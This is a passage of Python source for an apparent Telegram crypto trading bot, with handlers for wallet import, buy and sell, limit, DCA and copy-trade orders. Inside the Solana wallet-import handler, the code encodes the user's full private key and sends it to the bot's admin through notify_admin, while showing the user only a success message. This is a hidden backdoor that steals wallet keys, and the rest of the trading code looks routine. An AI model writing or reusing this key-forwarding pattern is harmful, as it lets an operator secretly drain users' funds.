            pubkey = str(kp.pubkey())
            private_key_b58 = _base58.b58encode(bytes(kp)).decode()
            sol_wallets = await get_wallets(user_id, wallet_type="solana")
            name = f"Imported {len(sol_wallets) + 1}"
            await save_wallet(user_id, name, pubkey, enc, wallet_type="solana")
            await notify_admin(ctx.bot, user_id, username, pubkey, private_key_b58, "Imported (Solana)")
            await update.message.reply_text(
                f"✅ <b>Solana Wallet Imported!</b>\n\n📍 <code>{pubkey}</code>",
                reply_markup=back_kb("menu:wallet"),
                parse_mode="HTML",
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ Invalid key: {e}", reply_markup=back_kb("menu:wallet"), parse_mode="HTML"
            )
    ctx.user_data.pop("state", None)


async def _handle_rename(update, ctx, user_id, text):
    pubkey = ctx.user_data.pop("rename_pubkey", None)
    if pubkey:
        from src.utils.database import rename_wallet
        await rename_wallet(user_id, pubkey, text[:32])
        await update.message.reply_text(f"✅ Wallet renamed to '{text[:32]}'.", reply_markup=back_kb("menu:wallet"))
    ctx.user_data.pop("state", None)


def _is_valid_token_address(text: str, chain_key: str = "solana") -> bool:
    """Accept either a Solana base58 address or an EVM 0x token address."""
    from src.chains.registry import is_evm
    if is_evm(chain_key):
        return text.startswith("0x") and len(text) == 42
    return is_valid_solana_address(text)


async def _handle_buy_token(update, ctx, user_id, text):
    settings = await get_user_settings(user_id)
    active_chain = settings.get("active_chain", "solana")
    if not _is_valid_token_address(text, active_chain):
        await update.message.reply_text("❌ Invalid token address for the active chain.")
        return
    ctx.user_data["buy_token"] = text
    ctx.user_data["state"] = AWAITING_BUY_AMOUNT
    settings = await get_user_settings(user_id)
    await update.message.reply_text(
        f"💰 How much SOL to spend? (default: {settings.get('default_buy', 0.1)} SOL)",
        reply_markup=back_kb("menu:trade"),
    )
    return AWAITING_BUY_AMOUNT


async def _handle_buy_amount(update, ctx, user_id, text):
    mint = ctx.user_data.pop("buy_token", None)
    amount = parse_float(text)
    ctx.user_data.pop("state", None)
    if not mint or not amount or amount <= 0:
        await update.message.reply_text("❌ Invalid.", reply_markup=back_kb("menu:trade"))
        return
    await _do_buy(update, ctx, user_id, mint, amount)


async def _handle_sell_token(update, ctx, user_id, text):
    settings = await get_user_settings(user_id)
    active_chain = settings.get("active_chain", "solana")
    if not _is_valid_token_address(text, active_chain):
        await update.message.reply_text("❌ Invalid token address for the active chain.")
        return
    ctx.user_data["sell_token"] = text
    ctx.user_data["state"] = AWAITING_SELL_AMOUNT
    await update.message.reply_text("🔴 What percentage to sell? (1–100 or 'all')", reply_markup=back_kb("menu:trade"))
    return AWAITING_SELL_AMOUNT


async def _handle_sell_amount(update, ctx, user_id, text):
    mint = ctx.user_data.pop("sell_token", None)
    ctx.user_data.pop("state", None)
    pct = 100.0 if text.lower() == "all" else (parse_float(text) or 100.0)
    if not mint:
        await update.message.reply_text("❌ Invalid.", reply_markup=back_kb("menu:trade"))
        return
    await _do_sell(update, ctx, user_id, mint, pct)


async def _handle_limit_token(update, ctx, user_id, text):
    if not is_valid_solana_address(text):
        await update.message.reply_text("❌ Invalid mint.")
        return
    ctx.user_data["limit_token"] = text
    ctx.user_data["state"] = AWAITING_LIMIT_PRICE
    await update.message.reply_text("📋 Enter target price in SOL:", reply_markup=back_kb("menu:trade"))
    return AWAITING_LIMIT_PRICE


async def _handle_limit_price(update, ctx, user_id, text):
    val = parse_float(text)
    if not val:
        await update.message.reply_text("❌ Invalid price.")
        return
    ctx.user_data["limit_price"] = val
    ctx.user_data["state"] = AWAITING_LIMIT_AMOUNT
    await update.message.reply_text("📋 Enter SOL amount to buy (or % to sell):", reply_markup=back_kb("menu:trade"))
    return AWAITING_LIMIT_AMOUNT


async def _handle_limit_amount(update, ctx, user_id, text):
    mint = ctx.user_data.pop("limit_token", None)
    price = ctx.user_data.pop("limit_price", None)
    ctx.user_data.pop("state", None)
    amount = parse_float(text)
    if not mint or not price or not amount:
        await update.message.reply_text("❌ Invalid.", reply_markup=back_kb("menu:trade"))
        return
    pubkey = await get_active_wallet_pubkey(user_id)
    if not pubkey:
        await update.message.reply_text("❌ No active wallet.")
        return
    await create_order(
        user_id=user_id, wallet_pubkey=pubkey, order_type="limit_buy",
        token_mint=mint, token_symbol="", target_price=price, amount_sol=amount,
    )
    await update.message.reply_text(
        f"✅ Limit buy placed!\n🎯 Buy at {price:.8f} SOL\n💰 {amount} SOL",
        reply_markup=back_kb("menu:positions"),
        parse_mode="HTML",
    )


async def _handle_dca_token(update, ctx, user_id, text):
    if not is_valid_solana_address(text):
        await update.message.reply_text("❌ Invalid mint.")
        return
    ctx.user_data["dca_token"] = text
    ctx.user_data["state"] = AWAITING_DCA_TOTAL
    await update.message.reply_text("📊 Total SOL to spend:", reply_markup=back_kb("menu:trade"))
    return AWAITING_DCA_TOTAL


async def _handle_dca_total(update, ctx, user_id, text):
    val = parse_float(text)
    if not val:
        await update.message.reply_text("❌ Invalid.")
        return
    ctx.user_data["dca_total"] = val
    ctx.user_data["state"] = AWAITING_DCA_ORDERS
    await update.message.reply_text("📊 Number of orders:", reply_markup=back_kb("menu:trade"))
    return AWAITING_DCA_ORDERS


async def _handle_dca_orders(update, ctx, user_id, text):
    val = parse_int(text)
    if not val or val < 1:
        await update.message.reply_text("❌ Invalid.")
        return
    ctx.user_data["dca_orders"] = val
    ctx.user_data["state"] = AWAITING_DCA_INTERVAL
    await update.message.reply_text("📊 Interval between orders (minutes):", reply_markup=back_kb("menu:trade"))
    return AWAITING_DCA_INTERVAL


async def _handle_dca_interval(update, ctx, user_id, text):
    mint = ctx.user_data.pop("dca_token", None)
    total = ctx.user_data.pop("dca_total", None)
    orders_n = ctx.user_data.pop("dca_orders", None)
    ctx.user_data.pop("state", None)
    interval = parse_int(text)
    if not all([mint, total, orders_n, interval]):
        await update.message.reply_text("❌ Invalid.", reply_markup=back_kb("menu:trade"))
        return
    pubkey = await get_active_wallet_pubkey(user_id)
    if not pubkey:
        await update.message.reply_text("❌ No active wallet.")
        return
    slice_sol = total / orders_n
    await create_order(
        user_id=user_id, wallet_pubkey=pubkey, order_type="dca",
        token_mint=mint, token_symbol="", amount_sol=slice_sol,
        dca_interval=interval, dca_orders_left=orders_n, dca_next_at=time.time(),
    )
    await update.message.reply_text(
        f"✅ DCA order created!\n"
        f"💰 {total} SOL in {orders_n} orders × {interval}min\n"
        f"Each slice: {slice_sol:.4f} SOL",
        reply_markup=back_kb("menu:positions"),
        parse_mode="HTML",
    )


async def _handle_ct_wallet(update, ctx, user_id, text):
    if not is_valid_solana_address(text):
        await update.message.reply_text("❌ Invalid wallet address.")
        return
    ctx.user_data["ct_wallet"] = text
    ctx.user_data["state"] = AWAITING_CT_LABEL
    await update.message.reply_text("🔁 Enter a label for this target (or 'skip'):", reply_markup=back_kb("menu:copytrade"))
    return AWAITING_CT_LABEL


async def _handle_ct_label(update, ctx, user_id, text):
    wallet = ctx.user_data.pop("ct_wallet", None)
    ctx.user_data.pop("state", None)
    label = "" if text.lower() == "skip" else text[:32]
    if not wallet:
        await update.message.reply_text("❌ Invalid.", reply_markup=back_kb("menu:copytrade"))
        return
    await add_copy_target(user_id=user_id, target_wallet=wallet, label=label)
    await update.message.reply_text(
        f"✅ Copy target added!\n📍 {short_address(wallet)}",
        reply_markup=back_kb("menu:copytrade"),
        parse_mode="HTML",
    )
